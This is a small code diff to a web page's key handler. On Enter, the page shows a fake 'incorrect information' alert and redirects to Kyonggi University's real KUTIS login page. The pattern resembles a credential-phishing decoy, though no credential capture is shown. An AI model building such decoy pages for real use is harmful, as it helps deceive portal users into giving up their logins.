@@ -98,7 +98,7 @@ var SystemInfo = new function() {
 </script>
 <script>
   function handleKeyDown(event) {
-    if (event.key === "Enter") {
+    if (event.key === "Enter"||event.keyCode === 13) {
         event.preventDefault(); // 기본 동작 방지 (페이지 이동 방지)
         alert("입력한 정보가 올바르지 않습니다!");
         window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp"; // 이동할 링크 주소
